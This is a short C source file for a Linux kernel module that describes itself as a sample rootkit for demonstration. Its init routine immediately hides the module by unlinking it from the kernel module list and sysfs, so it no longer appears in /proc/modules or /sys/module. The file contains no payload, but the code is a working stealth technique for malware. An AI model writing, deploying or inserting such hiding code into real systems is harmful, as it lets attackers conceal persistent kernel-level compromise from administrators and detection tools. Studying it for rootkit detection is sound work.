#include <linux/init.h>   
#include <linux/module.h> 
#include <linux/kernel.h>
#include <linux/device.h>
#include <linux/fs.h>    
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/types.h>
#include <linux/cdev.h>
#include <linux/cred.h>
#include <linux/version.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Tyler Riedal<riedalsolutions@gmail.com>");
MODULE_DESCRIPTION("Sample roootkit implementation for demonstrative purposes.");

static int module_hidden = 0;

static struct list_head *prev_mod;
static struct list_head *prev_kobj;

void hide_module(void)
{
    if (module_hidden) return;
    
    // Store addr of module for use when unhiding
    prev_mod = THIS_MODULE->list.prev;
    prev_kobj = THIS_MODULE->mkobj.kobj.entry.prev;
    
    // Hide from /proc/modules & /sys/module
    list_del(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
    
    THIS_MODULE->sect_attrs = NULL;
    THIS_MODULE->notes_attrs = NULL;
    
    module_hidden = !module_hidden;
}

void show_module(void)
{
    if (!module_hidden) return;
    list_add(&THIS_MODULE->list, prev_mod);
    module_hidden = !module_hidden;
}

static int __init init_mod(void)
{
    printk(KERN_INFO "rk: Module initialized.\n");
    hide_module();
	return 0;
}

static void __exit exit_mod(void)
{
    printk(KERN_INFO "rk: Module removed.\n");
}

module_init(init_mod);
module_exit(exit_mod);